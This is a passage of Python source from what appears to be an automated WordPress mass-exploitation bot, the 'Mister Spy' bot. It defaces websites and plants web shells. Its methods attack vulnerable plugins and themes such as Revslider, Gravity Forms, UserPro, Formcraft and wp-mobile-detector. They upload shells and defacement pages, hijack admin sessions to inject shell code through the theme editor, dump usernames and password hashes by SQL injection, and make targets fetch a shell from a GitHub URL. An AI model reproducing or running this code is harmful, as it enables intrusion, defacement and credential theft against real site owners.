                        self.Print_Vuln_index(site + '/wp-content/plugins/downloads-manager/upload/' +
                                              self.Jce_Deface_image.split('/')[1])
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                         self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Downloads-Manager', site)
            else:
                self.Print_NotVuln('Downloads-Manager', site)
        except:
            self.Print_NotVuln('Downloads-Manager', site)


    def GetWordpressPostId(self, zzz):
        try:
            PostId = requests.get('http://' + zzz + '/wp-json/wp/v2/posts/', timeout=5, headers=self.Headers)
            wsx = re.findall('"id":(.+?),"date"', PostId.text)
            postid = wsx[1].strip()
            return postid
        except:
            pass

    def wp_content_injection(self, site):
        try:
            zaq = self.GetWordpressPostId(site)
            headers = {'Content-Type': 'application/json',
                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
            xxx = str(zaq) + 'bbx'
            data = json.dumps({
                'content': '<h1>Done Hacked By Mister Spy\n<p><title>Hacked By Mister Spy<br />\n</title></p></h1>\n',
                'title': 'Hacked By Mister Spy',
                'id': xxx,
                'link': '/vuln-htm/',
                'slug': '"/vuln-htm/"'
            })
            GoT = requests.post('http://' + site + '/wp-json/wp/v2/posts/' + str(zaq), data=data,
                                headers=headers, timeout=10)
            if GoT:
                CheckIndex = 'http://' + site + '/vuln.htm'
                zcheck = requests.get(CheckIndex, timeout=10, headers=self.Headers)
                if 'Hackedd' in zcheck.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
            else:
                self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
        except:
            self.Print_NotVuln('Wordpress 4.7 Content Injection', site)

    def Wp_Job_Manager(self, site):
        try:
            Exploit = '/jm-ajax/upload_file/'
            CheckVuln = requests.get('http://' + site + Exploit, timeout=5, headers=self.Headers)
            if '"files":[]' in CheckVuln.text:
                try:
                    IndeXfile = {'file[]': open(self.Jce_Deface_image, 'rb')}
                    GoT = requests.post('http://' + site + Exploit, files=IndeXfile, timeout=5, headers=self.Headers)
                    GetIndeXpath = re.findall('"url":"(.*)"', GoT.text)
                    IndeXpath = GetIndeXpath[0].split('"')[0].replace('\/', '/').split('/wp-content')[1]
                    UploadedIndEX = site + '/wp-content' + IndeXpath
                    Checkindex = requests.get('http://' + UploadedIndEX, timeout=5, headers=self.Headers)
                    if 'D9ABB614B8D911E3AB27A52B5ED2F278' in Checkindex.text:
                        self.Print_Vuln_index(UploadedIndEX)
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(UploadedIndEX + '\n')
                    else:
                        self.Print_NotVuln('Wp-Job-Manager', site)
                except:
                    self.Print_NotVuln('Wp-Job-Manager', site)
            else:
                self.Print_NotVuln('Wp-Job-Manager', site)
        except:
            self.Print_NotVuln('Wp-Job-Manager', site)


    def wp_mobile_detector(self, site):
        try:
            ExploitShell = '/wp-content/plugins/wp-mobile-detector/resize.php?src=' \
                           'https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/settings_auto.php'
            ExploitGifUpload = '/wp-content/plugins/wp-mobile-detector/resize.php?src=' \
                           'https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/tools/pwn.gif'

            Ex = '/wp-content/plugins/wp-mobile-detector/resize.php'
            GoT = requests.get('http://' + site + Ex, timeout=5, headers=self.Headers)
            if 'D9ABB614B8D911E3AB27A52B5ED2F278' in GoT.text:
                requests.get('http://' + site + ExploitGifUpload, timeout=10, headers=self.Headers)
                requests.get('http://' + site + ExploitShell, timeout=10, headers=self.Headers)
                PathGif = '/wp-content/plugins/wp-mobile-detector/cache/spy.gif'
                PathShell = '/wp-content/plugins/wp-mobile-detector/cache/settings_auto.php'
                Check1 = 'http://' + site + PathGif
                Check2 = 'http://' + site + PathShell
                CheckIndex = requests.get(Check1, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    CheckShell = requests.get(Check2, timeout=5, headers=self.Headers)
                    if 'Now!MrSpyUp!!' in CheckShell.text:
                        Xshell = requests.get("http://" + site + "/wp-content/vuln.php",
                                              timeout=5, headers=self.Headers)
                        if 'SpyUploaderV1' in Xshell.text:
                            self.Print_vuln_Shell(site + "/wp-content/vuln.php")
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(site + "/wp-content/vuln.php" + '\n')
                        Xindex = requests.get("http://" + site + "/vuln.html", timeout=5, headers=self.Headers)
                        if 'spy0xProjectTop50' in Xindex.text:
                            self.Print_Vuln_index(site + '/vuln.html')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write(site + '/vuln.html' + '\n')
                    else:
                        self.Print_Vuln_index(site + '/wp-content/plugins/wp-mobile-detector/cache/pwn.gif')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/wp-mobile-detector/cache/pwn.gif' + '\n')
                else:
                    self.Print_NotVuln('wp-mobile-detector', site)
            else:
                self.Print_NotVuln('wp-mobile-detector', site)
        except:
            self.Print_NotVuln('wp-mobile-detector', site)

    def get_WpNoncE(self, source):
        try:
            find = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"', source)
            path = find[0].strip()
            return path
        except:
            pass

    def get_WpFlag(self, source):
        try:
            find = re.findall('<option value="(.*?)" selected="selected">', source)
            path = find[0].strip()
            return path
        except:
            pass

    def UserProExploit(self, site):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                       'Accept': '*/*'}
            exploit = '/?up_auto_log=true'
            sess = requests.session()
            sess.get('http://' + site, timeout=10, headers=headers)
            admin_re_page = 'http://' + site + '/wp-admin/'
            sess.get('http://' + site + exploit, timeout=10, headers=headers)
            Check_login = sess.get(admin_re_page, timeout=10, headers=headers)
            if '<li id="wp-admin-bar-logout">' in Check_login.text:
                self.AdminTakeOver('Userpro', site)
                with open('Exploited/UserPro.txt', 'a') as writer:
                    writer.write(site + exploit + '\n')
                ___Get_editor = admin_re_page + 'theme-editor.php?file=search.php#template'
                ___Get_edit = admin_re_page + 'theme-editor.php'
                Get_source = sess.get(___Get_editor, headers=headers, timeout=5)
                source = Get_source.text
                _Wp_FlaG = self.get_WpFlag(source)
                _Wp_NoncE = self.get_WpNoncE(source)
                __data = {'_wpnonce': _Wp_NoncE,
                          '_wp_http_referer': '/wp-admin/theme-editor.php?file=search.php',
                          'newcontent': self.shell_code,
                          'action': 'update',
                          'file': 'search.php',
                          'theme': _Wp_FlaG,
                          'scrollto': '0',
                          'docs-list': '',
                          'submit': 'Update+File'}
                sess.post(___Get_edit, data=__data, headers=headers)
                shell_PaTh = 'http://' + site + "/wp-content/themes/" + _Wp_FlaG + "/search.php"
                Check_sHell = sess.get(shell_PaTh, headers=headers)
                if 'wordpress_project' in Check_sHell.text:
                    __po = {'_upl': 'Upload'}
                    fil = {'file': open('Access.php', 'rb')}
                    requests.post(shell_PaTh, data=__po, files=fil, headers=headers)
                    shell_PaTh_DoNe = 'http://' + site + "/wp-content/themes/" + _Wp_FlaG + '/Access.php'
                    Got_Shell = requests.get(shell_PaTh_DoNe, timeout=5, headers=headers)
                    if 'b374k' in Got_Shell.text:
                        self.Print_vuln_Shell(site + "/wp-content/themes/" + _Wp_FlaG + "/Access.php")
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + "/wp-content/themes/" + _Wp_FlaG + "/Access.php" + '\n')
                    else:
                        self.Print_vuln_Shell(site + "/wp-content/themes/" + _Wp_FlaG + "/search.php")
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + "/wp-content/themes/" + _Wp_FlaG + "/search.php" + '\n')
            else:
                self.Print_NotVuln('UserPro', site)
        except:
            self.Print_NotVuln('UserPro', site)


    def formcraftExploit_Shell(self, site):
        try:
            ShellFile = {'files[]': open(self.pagelinesExploitShell, 'rb')}
            Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            Check = requests.get(Exp, timeout=5, headers=self.Headers)
            if '"failed"' in Check.text:
                GoT = requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
                if 'new_name' in GoT.text:
                    GetIndexName = re.findall('"new_name":"(.*)",', GoT.text)
                    IndexPath = site + '/wp-content/plugins/formcraft/file-upload/server/content/files/'\
                                + GetIndexName[0].split('"')[0]
                    CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                    if CheckIndex.status_code == 200:
                        CheckShell = requests.get('http://' + site + '/wp-content/vuln.php',
                                                  timeout=5, headers=self.Headers)
                        CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                        if 'SpyUploaderV1' in CheckShell.text:
                            self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(site + '/wp-content/vuln.php' + '\n')
                        if 'spy0xProjectTop50' in CheckIndex.text:
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                        else:
                            self.formcraftExploitIndeX(site)
                    else:
                        self.formcraftExploitIndeX(site)
                else:
                    self.formcraftExploitIndeX(site)
            else:
                self.formcraftExploitIndeX(site)
        except:
            self.formcraftExploitIndeX(site)

    def formcraftExploitIndeX(self, site):
        try:
            ShellFile = {'files[]': open(self.Jce_Deface_image, 'rb')}
            Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            Check = requests.get(Exp, timeout=5, headers=self.Headers)
            if '"failed"' in Check.text:
                GoT = requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
                if 'new_name' in GoT.text:
                    GetIndexName = re.findall('"new_name":"(.*)",', GoT.text)
                    IndexPath = site + '/wp-content/plugins/formcraft/file-upload/server/content/files/'\
                                + GetIndexName[0].split('"')[0]
                    CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                    if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                        self.Print_Vuln_index(IndexPath)
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(IndexPath + '\n')
                    else:
                        self.Print_NotVuln('formcraft', site)
                else:
                    self.Print_NotVuln('formcraft', site)
            else:
                self.Print_NotVuln('formcraft', site)
        except:
            self.Print_NotVuln('formcraft', site)



    def cherry_plugin(self, site):
        try:
            ShellFile = {'file': (self.pagelinesExploitShell, open(self.pagelinesExploitShell, 'rb')
                                  , 'multipart/form-data')}
            Exp = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
            requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
            Shell = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/' \
                    + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(Shell, timeout=5, headers=self.Headers)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                if 'SpyUploaderV1' in CheckShell.text:
                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                    with open('Exploited/Shells.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                if 'spy0xProjectTop50' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('cherry plugin', site)
            else:
                self.Print_NotVuln('cherry plugin', site)
        except:
            self.Print_NotVuln('cherry plugin', site)

    def addblockblocker(self, site):
        try:
            ShellFile = {'popimg': open(self.pagelinesExploitShell, 'rb')}
            Exp = 'http://' + site + '/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
            requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
            CheckShell = 'http://' + site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/' \
                         + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(CheckShell, timeout=5, headers=self.Headers)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                if 'SpyUploaderV1' in CheckShell.text:
                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                    with open('Exploited/Shells.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                if 'spy0xProjectTop50' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('Adblock Blocker', site)
            else:
                self.Print_NotVuln('Adblock Blocker', site)
        except:
            self.Print_NotVuln('Adblock Blocker', site)

    def HeadWayThemeExploit(self, site):
        try:
            CheckTheme = requests.get('http://' + site, timeout=5, headers=self.Headers)
            if '/wp-content/themes/headway' in CheckTheme.text:
                ThemePath = re.findall('/wp-content/themes/(.*)/style.css', CheckTheme.text)
                ShellFile = {'Filedata': open(self.pagelinesExploitShell, 'rb')}
                useragent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

                url = "http://" + site + "/wp-content/themes/" + ThemePath[0] +\
                      "/library/visual-editor/lib/upload-header.php"
                Check = requests.get(url, timeout=5, headers=self.Headers)
                if Check.status_code == 200:
                    GoT = requests.post(url, files=ShellFile, headers=useragent)
                    if GoT.status_code == 200:
                        Shell_URL = 'http://' + site + '/wp-content/uploads/headway/header-uploads/' +\
                                    self.pagelinesExploitShell.split('/')[1]
                        requests.get(Shell_URL, timeout=5, headers=self.Headers)
                        CheckShell = requests.get('http://' + site + '/wp-content/vuln.php',
                                                  timeout=5, headers=self.Headers)
                        CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                        if 'SpyUploaderV1' in CheckShell.text:
                            self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(site + '/wp-content/vuln.php' + '\n')
                        if 'spy0xProjectTop50' in CheckIndex.text:
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                        else:
                            self.Print_NotVuln('Headway Theme', site)
                    else:
                        self.Print_NotVuln('Headway Theme', site)
                else:
                    self.Print_NotVuln('Headway Theme', site)
            else:
                self.Print_NotVuln('Headway Theme', site)
        except:
            self.Print_NotVuln('Headway Theme', site)


    def pagelinesExploit(self, site):
        try:
            FileShell = {'file': open(self.pagelinesExploitShell, 'rb')}
            PostData = {'settings_upload': "settings", 'page': "pagelines"}
            Useragent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            url = "http://" + site + "/wp-admin/admin-post.php"
            GoT = requests.post(url, files=FileShell, data=PostData, headers=Useragent, timeout=5)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                if 'SpyUploaderV1' in CheckShell.text:
                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                    with open('Exploited/Shells.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                if 'spy0xProjectTop50' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('Pagelines', site)
            else:
                self.Print_NotVuln('Pagelines', site)
        except:
            self.Print_NotVuln('Pagelines', site)


    def wysijaExploit(self, site):
            try:
                FileShell = {'my-theme': open(self.MailPoetZipShell, 'rb')}
                PostData = {'action': "themeupload", 'submitter': "Upload", 'overwriteexistingtheme': "on",
                        'page': 'GZNeFLoZAb'}
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                url = "http://" + site + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
                GoT = requests.post(url, files=FileShell, data=PostData, headers=UserAgent, timeout=10)
                if 'page=wysija_campaigns&amp;action=themes&amp;reload=1' in GoT.text:
                    sh = 'http://' + site + '/wp-content/uploads/wysija/themes/spy/vuln.php'
                    index = 'http://' + site + '/wp-content/uploads/wysija/themes/spy/pwn.gif'
                    CheckShell = requests.get(sh, timeout=5, headers=self.Headers)
                    CheckIndex = requests.get(index, timeout=5, headers=self.Headers)
                    if 'MisterSpyShellForV7Bot0X_istanbul_2019' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/wp-content/uploads/wysija/themes/spy/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/wp-content/uploads/wysija/themes/spy/vuln.php' + '\n')
                    if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/wp-content/uploads/wysija/themes/spy/pwn.gif')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/wp-content/uploads/wysija/themes/spy/pwn.gif' + '\n')
                    else:
                        self.Print_NotVuln('wysija', site)
                else:
                    self.Print_NotVuln('wysija', site)
            except:
                self.Print_NotVuln('wysija', site)



    def HD_WebPlayerSqli(self, site):
        try:
            check = requests.get('http://' + site + '/wp-content/plugins/hd-webplayer/playlist.php',
                                 timeout=5, headers=self.Headers)
            if '<?xml version="' in check.text:
                Exploit = '/wp-content/plugins/hd-webplayer/playlist.php' \
                          '?videoid=1+union+select+1,2,concat(user_login,0x3a,user_pass)' \
                          ',4,5,6,7,8,9,10,11+from+wp_users--'
                GoT = requests.get('http://' + site + Exploit, timeout=5, headers=self.Headers)
                User_Pass = re.findall('<title>(.*)</title>', GoT.text)
                username = User_Pass[1].split(':')[0]
                password = User_Pass[1].split(':')[1]
                self.Print_Vuln('HD-Webplayer', site)
                self.Print_Username_Password(username, password)
                with open('Exploited/Sqli.txt', 'a') as writer:
                    writer.write('\n' + 'Domain: ' + site + '\n' +
                                 'Username : ' + username + '\n' + 'Password : ' + password + '\n')
            else:
                self.Print_NotVuln('HD-Webplayer', site)
        except:
            self.Print_NotVuln('HD-Webplayer', site)


    def Gravity_Forms_Shell(self, site):
        try:
            Grav_checker = requests.get('http://' + site + '/?gf_page=upload', timeout=5, headers=self.Headers)
            if '"status" : "error"' in Grav_checker.text:
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                fileDeface = {'file': open(self.gravShell, 'rb')}
                post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'css.php5'}
                try:
                    url = "http://" + site + '/?gf_page=upload'
                    GoT = requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
                    if '.php5' in GoT.text:
                        CheckShell = requests.get('http://' + site + '/wp-content/_input_3_css.php5',
                                                  timeout=5, headers=self.Headers)
                        if 'MrSpyUp!!' in CheckShell.text:
                            Checkshell2 = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5,
                                                       headers=self.Headers)
                            if 'SpyUploaderV1' in Checkshell2.text:
                                Checkshell = requests.get('http://' + site + '/wp-content/vuln.php',
                                                          timeout=5, headers=self.Headers)
                                CheckIndex = requests.get('http://' + site + '/vuln.htm',
                                                          timeout=5, headers=self.Headers)
                                if 'SpyUploaderV1' in Checkshell.text:
                                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                                    with open('Exploited/Shells.txt', 'a') as writer:
                                        writer.write(site + '/wp-content/vuln.php' + '\n')
                                if 'Vuln!!' in CheckIndex.text:
                                    self.Print_Vuln_index(site + '/vuln.htm')
                                    with open('Exploited/Index.txt', 'a') as writer:
                                        writer.write(site + '/vuln.htm' + '\n')
                                else:
                                    self.Gravity_forms_Index(site)
                            else:
                                self.Gravity_forms_Index(site)
                        else:
                            self.Gravity_forms_Index(site)
                    else:
                        self.Gravity_forms_Index(site)
                except:
                    self.Print_NotVuln('Gravity-Forms', site)
            else:
                self.Print_NotVuln('Gravity Forms', site)
        except:
            self.Timeout(site)


    def Gravity_forms_Index(self, site):
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(self.Jce_Deface_image, 'rb')}
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'spy.gif'}
        post_data2 = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../../', 'name': 'spy.gif'}
        try:
            url = "http://" + site + '/?gf_page=upload'
            requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
            requests.post(url, files=fileDeface, data=post_data2, headers=UserAgent, timeout=5)
            CheckIndex = requests.get('http://' + site + '/_input_3_spy.gif', timeout=5, headers=self.Headers)
            CheckIndex2 = requests.get('http://' + site + '/wp-content/_input_3_spy.gif',
                                       timeout=5, headers=self.Headers)
            if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                self.Print_Vuln_index(site + '/_input_3_spy.gif')
                with open('Exploited/Index.txt', 'a') as writer:
                    writer.write(site + '/_input_3_spy.gif' + '\n')
            elif 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex2.text:
                self.Print_Vuln_index(site + '/wp-content/_input_3_spy.gif')
                with open('Exploited/Index.txt', 'a') as writer:
                    writer.write(site + '/wp-content/_input_3_spy.gif' + '\n')
            else:
                self.Print_NotVuln('Gravity-Forms', site)
        except:
            self.Print_NotVuln('Gravity-Forms', site)

    def WP_User_Frontend(self, site):
        try:
            CheckVuln = requests.get('http://' + site + '/wp-admin/admin-ajax.php?action=wpuf_file_upload',
                                     timeout=5, headers=self.Headers)
            if 'error' in CheckVuln.text or CheckVuln.status_code == 200:
                post = {}
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post['action'] = 'wpuf_file_upload'
                files = {'wpuf_file': open(self.Jce_Deface_image, 'rb')}
                try:
                    _url = 'http://' + site + "/wp-admin/admin-ajax.php"
                    _open = requests.post(_url, files=files, data=post, headers=UserAgent, timeout=10)
                    if 'image][]' in _open.text:
                        _Def = site + "/wp-content/uploads/20" +\
                               self.year + "/" + self.month + "/" + self.Jce_Deface_image.split('/')[1]
                        Check_Deface = requests.get('http://' + _Def, timeout=5, headers=self.Headers)
                        if 'D9ABB614B8D911E3AB27A52B5ED2F278' in Check_Deface.text:
                            self.Print_Vuln_index(_Def)
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write(_Def + '\n')
                        else:
                            self.Print_NotVuln('WP-User-Frontend', site)
                    else:
                        self.Print_NotVuln('WP-User-Frontend', site)
                except:
                    self.Print_NotVuln('WP-User-Frontend', site)
            else:
                self.Print_NotVuln('WP-User-Frontend', site)
        except:
            self.Print_NotVuln('WP-User-Frontend', site)


    def Revslider_css(self, site):
        IndeXText = 'Vuln!! Hacked By Mister Spy'
        ency = {'action': "revslider_ajax_action",
                'client_action': "update_captions_css",
                'data': "<body style='color: transparent;background-color: black'><center><h1>"
                        "<b style='color: white'>" + IndeXText + "<p style='color: transparent'>",
                }
        try:
            url = "http://" + site +\
                  "/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css"
            aa = requests.post(url, data=ency, timeout=10, headers=self.Headers)
            if 'succesfully' in aa.text:
                deface = site + '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css'
                self.Print_Vuln_index(deface)
                with open('Exploited/Index.txt', 'a') as writer:
                    writer.write(deface + '\n')
            else:
                self.Print_NotVuln('Revslider', site)
        except:
            self.Print_NotVuln('Revslider', site)

    def Revslider_SHELL(self, site):
        try:
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            Exploit = 'http://' + site + '/wp-admin/admin-ajax.php'
            data = {'action': "revslider_ajax_action", 'client_action': "update_plugin"}
            FileShell = {'update_file': open(self.MailPoetZipShell, 'rb')}
            CheckRevslider = requests.get('http://' + site, timeout=10, headers=self.Headers)
            if '/wp-content/plugins/revslider/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev = requests.get('http://' + site +
                                        '/wp-content/plugins/revslider/temp/update_extract/spy.gif',
                                        timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/plugins/revslider/temp/update_extract/vuln.php',
                                              timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(site + '/wp-content/plugins/revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/plugins/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/wp-content/plugins/revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/Avada/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev1 = requests.get('http://' + site +
                                         '/wp-content/themes/Avada/framework/plugins/'
                                         'revslider/temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev1.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/Avada/framework/plugins/'
                                              'revslider/temp/update_extract/vuln.php',
                                              timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/Avada/framework/plugins/'
                                       'revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/Avada/framework/plugins/'
                               'revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/Avada/framework/plugins/'
                                   'revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/striking_r/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev2 = requests.get('http://' + site +
                                         '/wp-content/themes/striking_r/framework/plugins/'
                                         'revslider/temp/update_extract/spy.gif', timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev2.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/striking_r/framework/plugins/'
                                              'revslider/temp/update_extract/vuln.php',
                                              timeout=10, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/striking_r/framework/'
                                   'plugins/revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/striking_r/framework/plugins/'
                                       'revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/striking_r/framework/'
                                   'plugins/revslider/temp/update_extract/spy.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/IncredibleWP/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev3 = requests.get('http://' + site +
                                         '/wp-content/themes/IncredibleWP/framework/'
                                         'plugins/revslider/temp/update_extract/spy.gif',
                                         timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckRev3.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/IncredibleWP/framework'
                                              '/plugins/revslider/temp/update_extract/vuln.php',
                                              timeout=5, headers=self.Headers)
                    if 'SpyUploaderV1' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/IncredibleWP/framework/'
                                   'plugins/revslider/temp/update_extract/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/IncredibleWP/'
                                       'framework/plugins/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/IncredibleWP/'
                               'framework/plugins/revslider/temp/update_extract/spy.gif')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/IncredibleWP/'
